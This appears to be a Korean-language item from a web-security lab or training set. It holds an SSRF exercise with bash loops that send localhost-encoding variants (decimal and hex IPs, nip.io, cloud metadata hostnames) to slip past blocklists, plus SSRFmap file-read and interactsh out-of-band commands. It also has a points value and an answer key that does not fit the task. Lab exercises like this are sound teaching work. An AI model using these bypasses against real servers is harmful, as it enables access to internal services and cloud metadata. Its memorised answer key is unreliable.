- order: 3
  instruction: |-
    {{WEB_IP}} 대상으로 localhost 서비스 접근 테스트를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: localhost 표현 우회 (블랙리스트 피하기)
    ```bash
    # 동일 호스트의 다양한 표현
    LOCAL_VARIANTS=(
      "127.0.0.1"          # IPv4 정상
      "localhost"           # 호스트명
      "0.0.0.0"             # 모든 인터페이스
      "[::1]"               # IPv6
      "[::]"                # IPv6 unspecified
      "127.1"               # 단축
      "127.0.1"             # 단축 변형
      "2130706433"          # 10진수 (= 0x7f000001)
      "0x7f000001"          # 16진수
      "017700000001"        # 8진수
      "127.0.0.1.nip.io"    # nip.io DNS resolver
      "127.0.0.1.xip.io"    # xip.io
      "metadata.google.internal"  # GCP
    )
    for v in "${LOCAL_VARIANTS[@]}"; do
      RESP=$(curl -s -X PUT "http://10.20.30.80/api/Users/1" \
        -H "Authorization: Bearer $JWT" \
        -d "{\"profileImage\":\"http://$v/admin\"}" -w '%{http_code}' -o /dev/null)
      echo "$v → $RESP"
    done
    echo "localhost 서비스 접근 테스트 완료"
    ```

    ▶ 2단계: 도구 A — SSRFmap 의 internal scan
    ```bash
    python3 ~/SSRFmap/ssrfmap.py -r request.txt -p url -m readfiles
    # 또는 -m smtp / -m redis / -m fastcgi
    ```

    ▶ 3단계: 도구 B — interactsh 으로 OOB 검증
    ```bash
    # localhost 우회가 안 통하면 outbound DNS 만이라도 시도
    URL="http://$(interactsh-client | head -1)"
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -d "{\"profileImage\":\"$URL\"}"
    # interactsh 가 DNS 쿼리 받으면 = 서버가 fetch 시도 (Blind SSRF)
    ```

    ▶ 4단계: 표현 별 우회 효과
    | 패턴 | 일반 차단 | 우회 가능 |
    |---|---|---|
    | `127.0.0.1` 직접 | ❌ | regex 기본 |
    | `localhost` | ❌ | DNS 차단 |
    | `0.0.0.0` | ⚠️ | 일부 차단 |
    | `2130706433` (10진수) | ✅ | 대부분 통과 |
    | `127.1` (단축) | ✅ | 대부분 통과 |
    | `nip.io` | ✅ | DNS 거부 안 함 |

    ▶ 5단계: 답변
    각 변형 응답 코드 quote + 우회 성공 표현 + 방어 (DNS resolver 후 IP 검증 / netaddr.IPNetwork('127.0.0.0/8') 비교) 1 문장.
  hint: '13 표현 변형 / SSRFmap / interactsh OOB / 우회 효과 표 / DNS resolver 검증.'
  category: ssrf
  points: 10
  answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'localhost 서비스
    접근 테스트 완료'
  answer_detail: localhost 서비스 접근 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
